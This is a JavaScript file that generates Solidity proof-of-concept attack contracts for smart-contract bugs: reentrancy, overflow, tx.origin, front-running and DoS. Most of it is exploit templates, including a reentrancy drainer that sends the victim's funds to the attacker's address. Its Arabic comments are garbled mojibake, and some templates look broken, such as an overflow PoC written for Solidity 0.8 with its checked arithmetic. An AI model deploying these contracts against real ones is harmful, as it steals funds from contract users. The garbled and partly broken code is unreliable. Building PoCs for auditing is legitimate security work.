// ===== poc-generator.js =====
// Ù…ÙˆÙ„Ø¯ Proof of Concept Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ

class POCGenerator {
    
    // ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ PoC ÙƒØ§Ù…Ù„ Ù„Ø«ØºØ±Ø© Ù…Ø¹ÙŠÙ†Ø©
    static generate(vulnType, targetAddress = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0") {
        const vuln = VulnerabilityDB[vulnType];
        if (!vuln) return "// Ù†ÙˆØ¹ Ø§Ù„Ø«ØºØ±Ø© ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        
        const now = new Date();
        const date = now.toLocaleDateString('ar-EG');
        
        return `// ============================================
// ğŸ”¬ Proof of Concept - ${vuln.name}
// Ø§Ù„ØªØ§Ø±ÙŠØ®: ${date}
// Ø§Ù„Ø¨Ø§Ø­Ø«: Generated by Solidity PoC Scanner
// Ø§Ù„Ø¹Ù‚Ø¯ Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù: ${targetAddress}
// Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø®Ø·ÙˆØ±Ø©: ${vuln.severity}
// ============================================

pragma solidity ^0.8.0;

// ========== 1. ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ø¹Ù‚Ø¯ Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù ==========
interface IVictim {
${this.generateInterface(vulnType)}
}

// ========== 2. Ø¹Ù‚Ø¯ Ø§Ù„Ù‡Ø¬ÙˆÙ… ==========
contract Attack${this.getAttackName(vulnType)} {
    IVictim public victim;
    address public attacker;
    uint256 public attackCount;
    
    // Ø§Ù„Ø£Ø­Ø¯Ø§Ø« Ù„Ù„ØªØªØ¨Ø¹
    event PocStarted(string message);
    event AttackExecuted(uint256 round, uint256 value);
    event Profit(uint256 amount);
    event Balance(string who, uint256 amount);
    
    constructor(address _victim) {
        victim = IVictim(_victim);
        attacker = msg.sender;
    }
    
    /**
     * @dev ØªÙ†ÙÙŠØ° Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø«ØºØ±Ø©
     */
    function executePOC() public payable {
        emit PocStarted("Ø¨Ø¯Ø¡ Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø«ØºØ±Ø© - ${vuln.name}");
        
        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø£Ø±ØµØ¯Ø© Ù‚Ø¨Ù„ Ø§Ù„Ù‡Ø¬ÙˆÙ…
        uint256 attackerBalanceBefore = address(this).balance;
        uint256 victimBalanceBefore = address(victim).balance;
        
        emit Balance("Attacker (Before)", attackerBalanceBefore);
        emit Balance("Victim (Before)", victimBalanceBefore);
        
        // ========== ØªÙ†ÙÙŠØ° Ø§Ù„Ù‡Ø¬ÙˆÙ… ==========
${this.generateAttackCode(vulnType)}
        
        // ========== Ø­Ø³Ø§Ø¨ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ ==========
        uint256 attackerBalanceAfter = address(this).balance;
        uint256 victimBalanceAfter = address(victim).balance;
        
        emit Balance("Attacker (After)", attackerBalanceAfter);
        emit Balance("Victim (After)", victimBalanceAfter);
        
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore;
        emit Profit(profit);
        
        // Ø³Ø­Ø¨ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­ Ù„Ù„Ù…Ø®ØªØ¨ÙØ±
        if (profit > 0) {
            payable(attacker).transfer(address(this).balance);
        }
    }
    
    // Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø£Ù…ÙˆØ§Ù„
    receive() external payable {
${this.generateReceiveHandler(vulnType)}
    }
    
    // Ø³Ø­Ø¨ Ø§Ù„Ø£Ù…ÙˆØ§Ù„ Ø§Ù„Ù…ØªØ¨Ù‚ÙŠØ©
    function withdraw() public {
        require(msg.sender == attacker, "Only attacker");
        payable(attacker).transfer(address(this).balance);
    }
}

// ========== 3. Ø´Ø±Ø­ Ø®Ø·ÙˆØ§Øª Ø¥Ø«Ø¨Ø§Øª Ø§Ù„Ø«ØºØ±Ø© ==========
/*
${vuln.pocSteps.join('\n')}

ğŸ”§ Ø§Ù„Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ù…Ù‚ØªØ±Ø­:
${vuln.fix}
*/`;
    }
    
    // ØªÙˆÙ„ÙŠØ¯ ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ø¹Ù‚Ø¯ Ø­Ø³Ø¨ Ù†ÙˆØ¹ Ø§Ù„Ø«ØºØ±Ø©
    static generateInterface(vulnType) {
        const interfaces = {
            reentrancy: `    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address account) external view returns (uint256);`,
            
            overflow: `    function transfer(address to, uint256 amount) external;
    function mint(uint256 amount) external;
    function balances(address account) external view returns (uint256);`,
            
            txorigin: `    function withdrawAll() external;`,
            
            frontrun: `    function guess(uint256 number) external;
    function setSecret(uint256 _secret) external;`,
            
            dos: `    function airdrop() external;
    function addUser(address user) external;`
        };
        
        return interfaces[vulnType] || `    function vulnerable() external;`;
    }
    
    // ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø§Ù„Ù‡Ø¬ÙˆÙ…
    static generateAttackCode(vulnType) {
        const attacks = {
            reentrancy: `        // 1. Ø¥ÙŠØ¯Ø§Ø¹ 1 Ø¥ÙŠØ«Ø±
        victim.deposit{value: 1 ether}();
        
        // 2. Ø¨Ø¯Ø¡ Ù‡Ø¬ÙˆÙ… Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„
        victim.withdraw(1 ether);`,
            
            overflow: `        // 1. Ø¥Ø«Ø¨Ø§Øª Underflow
        victim.transfer(msg.sender, 1);
        
        // 2. Ø¥Ø«Ø¨Ø§Øª Overflow
        victim.mint(1);`,
            
            txorigin: `        // ØªÙ†ÙÙŠØ° Ø³Ø­Ø¨ Ø§Ù„Ø£Ù…ÙˆØ§Ù„
        // tx.origin = Ø§Ù„Ø¶Ø­ÙŠØ©
        // msg.sender = Ù‡Ø°Ø§ Ø§Ù„Ø¹Ù‚Ø¯
        victim.withdrawAll();`,
            
            frontrun: `        // ØªØ®Ù…ÙŠÙ† Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØµØ­ÙŠØ­
        // ÙŠØ¬Ø¨ Ù…Ø¹Ø±ÙØ© secret Ù…Ø³Ø¨Ù‚Ø§Ù‹
        victim.guess(123456);`,
            
            dos: `        // 1. Ø¥Ø¶Ø§ÙØ© Ø¹Ù‚Ø¯ ÙŠØ±ÙØ¶ Ø§Ù„Ø§Ø³ØªÙ‚Ø¨Ø§Ù„
        victim.addUser(address(this));
        
        // 2. Ù…Ø­Ø§ÙˆÙ„Ø© ØªÙˆØ²ÙŠØ¹ - Ø³ØªÙØ´Ù„
        victim.airdrop();`
        };
        
        return attacks[vulnType] || `        // ÙƒÙˆØ¯ Ø§Ù„Ù‡Ø¬ÙˆÙ… Ù‡Ù†Ø§`;
    }
    
    // ØªÙˆÙ„ÙŠØ¯ Ù…Ø¹Ø§Ù„Ø¬ receive
    static generateReceiveHandler(vulnType) {
        if (vulnType === 'reentrancy') {
            return `        attackCount++;
        
        if (attackCount < 5) {
            // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù‡Ø¬ÙˆÙ…
            uint256 amount = victim.balances(address(this));
            victim.withdraw(amount);
        }`;
        }
        
        if (vulnType === 'dos') {
            return `        revert("I don't accept ETH"); // Ù…Ù†Ø¹ Ø§Ù„ØªÙˆØ²ÙŠØ¹`;
        }
        
        return `        // Ù„Ø§ ØªÙØ¹Ù„ Ø´ÙŠØ¦Ø§Ù‹`;
    }
    
    static getAttackName(vulnType) {
        const names = {
            reentrancy: 'Reentrancy',
            overflow: 'Overflow',
            txorigin: 'TxOrigin',
            frontrun: 'FrontRun',
            dos: 'DoS'
        };
        return names[vulnType] || 'POC';
    }
}

// ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ PoC
function generatePOC() {
    const vulnType = document.getElementById('vulnType').value;
    const pocCode = POCGenerator.generate(vulnType);
    
    const codeBlock = document.getElementById('pocCode');
    codeBlock.innerHTML = `<pre><code class="solidity">${escapeHtml(pocCode)}</code></pre>`;
    
    hljs.highlightAll();
}

// Ù†Ø³Ø® Ø§Ù„ÙƒÙˆØ¯
function copyPOC() {
    const code = document.querySelector('#pocCode code').innerText;
    navigator.clipboard.writeText(code);
    alert('âœ… ØªÙ… Ù†Ø³Ø® ÙƒÙˆØ¯ PoC Ø¨Ù†Ø¬Ø§Ø­');
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
